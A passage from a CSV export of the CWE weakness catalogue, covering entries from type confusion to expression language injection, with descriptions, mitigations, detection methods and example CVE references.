privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1193::REFERENCE:CVE-2010-3716:DESCRIPTION:Chain: drafted web request allows the creation of users with arbitrary group membership.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3716::REFERENCE:CVE-2008-5397:DESCRIPTION:Chain: improper processing of configuration options causes users to contain unintended group memberships.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5397::REFERENCE:CVE-2007-6644:DESCRIPTION:CMS does not prevent remote administrators from promoting other users to the administrator group, in violation of the intended security model.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6644::REFERENCE:CVE-2007-3260:DESCRIPTION:Product assigns members to the root group, allowing escalation of privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3260::REFERENCE:CVE-2002-0080:DESCRIPTION:Chain: daemon does not properly clear groups before dropping privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0080::\",,,\"\",,\"\",\n843,\"Access of Resource Using Incompatible Type ('Type Confusion')\",Base,Incomplete,\"The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.\",\"When the product accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access. While this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways. This weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.\",::NATURE:ChildOf:CWE ID:704:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:704:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Object Type Confusion::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:NOTE:When a memory buffer is accessed using the wrong type, it could read or write memory out of the bounds of the buffer, if the allocated buffer is smaller than the type that the code is attempting to access, leading to a crash and possibly code execution.::\",\"\",\"\",\"::REFERENCE:CVE-2010-4577:DESCRIPTION:Type confusion in CSS sequence leads to out-of-bounds read.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4577::REFERENCE:CVE-2011-0611:DESCRIPTION:Size inconsistency allows code execution, first discovered when it was actively exploited in-the-wild.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0611::REFERENCE:CVE-2010-0258:DESCRIPTION:Improperly-parsed file containing records of different types leads to code execution when a memory location is interpreted as a different object than intended.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0258::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP39-C:ENTRY NAME:Do not access a variable through a pointer of an incompatible type:MAPPING FIT:Exact::\",,\"::TYPE:Applicable Platform:NOTE:This weakness is possible in any type-unsafe programming language.::TYPE:Research Gap:NOTE:Type confusion weaknesses have received some attention by applied researchers and major software vendors for C and C++ code. Some publicly-reported vulnerabilities probably have type confusion as a root-cause weakness, but these may be described as memory corruption instead. For other languages, there are very few public reports of type confusion weaknesses. These are probably under-studied. Since many programs rely directly or indirectly on loose typing, a potential type confusion behavior might be intentional, possibly requiring more manual analysis.::\",\n908,\"Use of Uninitialized Resource\",Base,Incomplete,\"The product uses or accesses a resource that has not been initialized.\",\"When a resource has not been properly initialized, the product may behave unexpectedly. This may lead to a crash or invalid memory access, but the consequences vary depending on the type of resource and how it is used within the product.\",::NATURE:ChildOf:CWE ID:665:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:665:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data:NOTE:When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all required steps.::PHASE:Implementation:DESCRIPTION:Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.::PHASE:Implementation:DESCRIPTION:Avoid race conditions (CWE-362) during initialization routines.::PHASE:Build and Compilation:DESCRIPTION:Run or compile the product with settings that generate warnings about uninitialized variables or data.::\",\"::REFERENCE:CVE-2019-9805:DESCRIPTION:Chain: Creation of the packet client occurs before initialization is complete (CWE-696) resulting in a read from uninitialized memory (CWE-908), causing memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-9805::REFERENCE:CVE-2008-4197:DESCRIPTION:Use of uninitialized memory may allow code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4197::REFERENCE:CVE-2008-2934:DESCRIPTION:Free of an uninitialized pointer leads to crash and possible code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2934::REFERENCE:CVE-2008-0063:DESCRIPTION:Product does not clear memory contents when generating an error message, leading to information leak.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0063::REFERENCE:CVE-2008-0062:DESCRIPTION:Lack of initialization triggers NULL pointer dereference or double-free.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0062::REFERENCE:CVE-2008-0081:DESCRIPTION:Uninitialized variable leads to code execution in popular desktop application.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0081::REFERENCE:CVE-2008-3688:DESCRIPTION:Chain: Uninitialized variable leads to infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3688::REFERENCE:CVE-2008-3475:DESCRIPTION:Chain: Improper initialization leads to memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3475::REFERENCE:CVE-2005-1036:DESCRIPTION:Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1036::REFERENCE:CVE-2008-3597:DESCRIPTION:Chain: game server can access player data structures before initialization has happened leading to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3597::REFERENCE:CVE-2009-2692:DESCRIPTION:Chain: uninitialized function pointers can be dereferenced allowing code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2692::REFERENCE:CVE-2009-0949:DESCRIPTION:Chain: improper initialization of memory can lead to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0949::REFERENCE:CVE-2009-3620:DESCRIPTION:Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3620::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP33-C:ENTRY NAME:Do not read uninitialized memory:MAPPING FIT:CWE More Abstract::\",,\"\",\n909,\"Missing Initialization of Resource\",Class,Incomplete,\"The product does not initialize a critical resource.\",\"Many resources require initialization before they can be properly used. If a resource is not initialized, it could contain unpredictable or expired data, or it could be initialized to defaults that are invalid. This can have security implications when the resource is expected to have certain properties or values.\",::NATURE:ChildOf:CWE ID:665:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:665:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:908:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data:NOTE:When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all specified steps.::PHASE:Implementation:DESCRIPTION:Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.::PHASE:Implementation:DESCRIPTION:Avoid race conditions (CWE-362) during initialization routines.::PHASE:Build and Compilation:DESCRIPTION:Run or compile your product with settings that generate warnings about uninitialized variables or data.::\",\"::REFERENCE:CVE-2020-20739:DESCRIPTION:A variable that has its value set in a conditional statement is sometimes used when the conditional fails, sometimes causing data leakage:LINK:https://www.cve.org/CVERecord?id=CVE-2020-20739::REFERENCE:CVE-2005-1036:DESCRIPTION:Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1036::\",,,\"\",,\"\",\n910,\"Use of Expired File Descriptor\",Base,Incomplete,\"The product uses or accesses a file descriptor after it has been closed.\",\"After a file descriptor for a particular file or device has been released, it can be reused. The code might not write to the original file, since the reused file descriptor might reference a different file or device.\",::NATURE:ChildOf:CWE ID:672:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Stale file descriptor::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The program could read data from the wrong file.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Accessing a file descriptor that has been closed can cause a crash.::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO46-C:ENTRY NAME:Do not access a closed file:MAPPING FIT:Exact::\",,\"\",\n911,\"Improper Update of Reference Count\",Base,Incomplete,\"The product uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.\",\"Reference counts can be used when tracking how many objects contain a reference to a particular resource, such as in memory management or garbage collection. When the reference count reaches zero, the resource can be de-allocated or reused because there are no more objects that use it. If the reference count accidentally reaches zero, then the resource might be released too soon, even though it is still in use. If all objects no longer use the resource, but the reference count is not zero, then the resource might not ever be released.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:672:VIEW ID:1000::NATURE:CanPrecede:CWE ID:772:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"\",\"\",\"\",\"::REFERENCE:CVE-2002-0574:DESCRIPTION:chain: reference count is not decremented, leading to memory leak in OS by sending ICMP packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0574::REFERENCE:CVE-2004-0114:DESCRIPTION:Reference count for shared memory not decremented when a function fails, potentially allowing unprivileged users to read kernel memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0114::REFERENCE:CVE-2006-3741:DESCRIPTION:chain: improper reference count tracking leads to file descriptor consumption:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3741::REFERENCE:CVE-2007-1383:DESCRIPTION:chain: integer overflow in reference counter causes the same variable to be destroyed twice.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1383::REFERENCE:CVE-2007-1700:DESCRIPTION:Incorrect reference count calculation leads to improper object destruction and code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1700::REFERENCE:CVE-2008-2136:DESCRIPTION:chain: incorrect update of reference count leads to memory leak.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2136::REFERENCE:CVE-2008-2785:DESCRIPTION:chain/composite: use of incorrect data type for a reference counter allows an overflow of the counter, leading to a free of memory that is still in use.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2785::REFERENCE:CVE-2008-5410:DESCRIPTION:Improper reference counting leads to failure of cryptographic operations.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5410::REFERENCE:CVE-2009-1709:DESCRIPTION:chain: improper reference counting in a garbage collection routine leads to use-after-free:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1709::REFERENCE:CVE-2009-3553:DESCRIPTION:chain: reference count not correctly maintained when client disconnects during a large operation, leading to a use-after-free.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3553::REFERENCE:CVE-2009-3624:DESCRIPTION:Reference count not always incremented, leading to crash or code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3624::REFERENCE:CVE-2010-0176:DESCRIPTION:improper reference counting leads to expired pointer dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0176::REFERENCE:CVE-2010-0623:DESCRIPTION:OS kernel increments reference count twice but only decrements once, leading to resource consumption and crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0623::REFERENCE:CVE-2010-2549:DESCRIPTION:OS kernel driver allows code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2549::REFERENCE:CVE-2010-4593:DESCRIPTION:improper reference counting leads to exhaustion of IP addresses:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4593::REFERENCE:CVE-2011-0695:DESCRIPTION:Race condition causes reference counter to be decremented prematurely, leading to the destruction of still-active object and an invalid pointer dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0695::REFERENCE:CVE-2012-4787:DESCRIPTION:improper reference counting leads to use-after-free:LINK:https://www.cve.org/CVERecord?id=CVE-2012-4787::\",,,\"\",,\"\",\n914,\"Improper Control of Dynamically-Identified Variables\",Base,Incomplete,\"The product does not properly restrict reading from or writing to dynamically-identified variables.\",\"Many languages offer powerful features that allow the programmer to access arbitrary variables that are specified by an input string. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can modify unintended variables that have security implications.\",::NATURE:ChildOf:CWE ID:99:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:913:VIEW ID:1000::,\"::ORDINALITY:Primary::\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:An attacker could modify sensitive data or program variables.::SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands::SCOPE:Other:SCOPE:Integrity:IMPACT:Varies by Context:IMPACT:Alter Execution Logic::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:For any externally-influenced input, check the input against an allowlist of internal program variables that are allowed to be modified.::PHASE:Implementation Architecture and Design:STRATEGY:Refactoring:DESCRIPTION:Refactor the code so that internal program variables do not need to be dynamically identified.::\",\"::REFERENCE:CVE-2006-7135:DESCRIPTION:extract issue enables file inclusion:LINK:https://www.cve.org/CVERecord?id=CVE-2006-7135::REFERENCE:CVE-2006-7079:DESCRIPTION:Chain: extract used for register_globals compatibility layer, enables path traversal (CWE-22):LINK:https://www.cve.org/CVERecord?id=CVE-2006-7079::REFERENCE:CVE-2007-0649:DESCRIPTION:extract() buried in include files makes post-disclosure analysis confusing; original report had seemed incorrect.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0649::REFERENCE:CVE-2006-6661:DESCRIPTION:extract() enables static code injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6661::REFERENCE:CVE-2006-2828:DESCRIPTION:import_request_variables() buried in include files makes post-disclosure analysis confusing:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2828::REFERENCE:CVE-2009-0422:DESCRIPTION:Chain: Dynamic variable evaluation allows resultant remote file inclusion and path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0422::REFERENCE:CVE-2007-2431:DESCRIPTION:Chain: dynamic variable evaluation in PHP program used to modify critical, unexpected $_SERVER variable for resultant XSS.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2431::REFERENCE:CVE-2006-4904:DESCRIPTION:Chain: dynamic variable evaluation in PHP program used to conduct remote file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4904::REFERENCE:CVE-2006-4019:DESCRIPTION:Dynamic variable evaluation in mail program allows reading and modifying attachments and preferences of other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4019::\",,,\"\",,\"\",\n915,\"Improperly Controlled Modification of Dynamically-Determined Object Attributes\",Base,Incomplete,\"The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.\",\"If the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability. This weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.\",::NATURE:ChildOf:CWE ID:913:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:502:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Ruby:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:ASP.NET:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Python:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Mass Assignment:DESCRIPTION:Mass assignment is the name of a feature in Ruby on Rails that allows simultaneous modification of multiple object attributes.::TERM:AutoBinding:DESCRIPTION:The Autobinding term is used in frameworks such as Spring MVC and ASP.NET MVC.::TERM:PHP Object Injection:DESCRIPTION:Some PHP application researchers use this term for attacking unsafe use of the unserialize() function, but it is also used for CWE-502.::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:An attacker could modify sensitive data or program variables.::SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands::SCOPE:Other:SCOPE:Integrity:IMPACT:Varies by Context:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:If available, use features of the language or framework that allow specification of allowlists of attributes or fields that are allowed to be modified. If possible, prefer allowlists over denylists. For applications written with Ruby on Rails, use the attr_accessible (allowlist) or attr_protected (denylist) macros in each class that may be used in mass assignment.::PHASE:Architecture and Design Implementation:DESCRIPTION:If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:For any externally-influenced input, check the input against an allowlist of internal object attributes or fields that are allowed to be modified.::PHASE:Implementation Architecture and Design:STRATEGY:Refactoring:DESCRIPTION:Refactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes.::\",\"::REFERENCE:CVE-2024-3283:DESCRIPTION:Application for using LLMs allows modification of a sensitive variable using mass assignment.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-3283::REFERENCE:CVE-2012-2054:DESCRIPTION:Mass assignment allows modification of arbitrary attributes using modified URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-2054::REFERENCE:CVE-2012-2055:DESCRIPTION:Source version control product allows modification of trusted key using mass assignment.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-2055::REFERENCE:CVE-2008-7310:DESCRIPTION:Attackers can bypass payment step in e-commerce product.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-7310::REFERENCE:CVE-2013-1465:DESCRIPTION:Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-1465::REFERENCE:CVE-2012-3527:DESCRIPTION:Use of PHP unserialize function on untrusted input in content management system might allow code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3527::REFERENCE:CVE-2012-0911:DESCRIPTION:Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0911::REFERENCE:CVE-2012-0911:DESCRIPTION:Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0911::REFERENCE:CVE-2011-4962:DESCRIPTION:Content management system written in PHP allows code execution through page comments.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-4962::REFERENCE:CVE-2009-4137:DESCRIPTION:Use of PHP unserialize function on cookie value allows remote code execution or upload of arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4137::REFERENCE:CVE-2007-5741:DESCRIPTION:Content management system written in Python interprets untrusted data as pickles, allowing code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5741::REFERENCE:CVE-2011-2520:DESCRIPTION:Python script allows local users to execute code via pickled data.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-2520::REFERENCE:CVE-2005-2875:DESCRIPTION:Python script allows remote attackers to execute arbitrary code using pickled objects.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2875::REFERENCE:CVE-2013-0277:DESCRIPTION:Ruby on Rails allows deserialization of untrusted YAML to execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-0277::REFERENCE:CVE-2011-2894:DESCRIPTION:Spring framework allows deserialization of objects from untrusted sources to execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-2894::REFERENCE:CVE-2012-1833:DESCRIPTION:Grails allows binding of arbitrary parameters to modify arbitrary object properties.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-1833::REFERENCE:CVE-2010-3258:DESCRIPTION:Incorrect deserialization in web browser allows escaping the sandbox.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3258::REFERENCE:CVE-2008-1013:DESCRIPTION:Media library allows deserialization of objects by untrusted Java applets, leading to arbitrary code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1013::\",,,\"\",,\"::TYPE:Maintenance:NOTE:The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.::\",\n916,\"Use of Password Hash With Insufficient Computational Effort\",Base,Incomplete,\"The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.\",\"Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash. Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker. There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack: The amount of CPU time required to compute the hash (stretching) The amount of memory required to compute the hash (memory-hard operations) Including a random value, along with the password, as input to the hash computation (salting) Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs (one-way hashing) Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs (collision resistance) Note that the security requirements for the product may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.\",::NATURE:ChildOf:CWE ID:328:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:327:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (stretching) or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use. Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead. Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.:EFFECTIVENESS:High::PHASE:Implementation Architecture and Design:DESCRIPTION:When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.::\",\"::REFERENCE:CVE-2008-1526:DESCRIPTION:Router does not use a salt with a hash, making it easier to crack passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1526::REFERENCE:CVE-2006-1058:DESCRIPTION:Router does not use a salt with a hash, making it easier to crack passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-1058::REFERENCE:CVE-2008-4905:DESCRIPTION:Blogging software uses a hard-coded salt when calculating a password hash.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4905::REFERENCE:CVE-2002-1657:DESCRIPTION:Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1657::REFERENCE:CVE-2001-0967:DESCRIPTION:Server uses a constant salt when encrypting passwords, simplifying brute force attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0967::REFERENCE:CVE-2005-0408:DESCRIPTION:chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0408::\",,,\"\",::55::,\"\",\n917,\"Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')\",Base,Incomplete,\"The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.\",\"Frameworks such as Java Server Page (JSP) allow a developer to insert executable expressions within otherwise-static content. When the developer is not aware of the executable nature of these expressions and/or does not disable them, then if an attacker can inject expressions, this could lead to code execution or other unexpected behaviors.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1336:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:EL Injection::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, 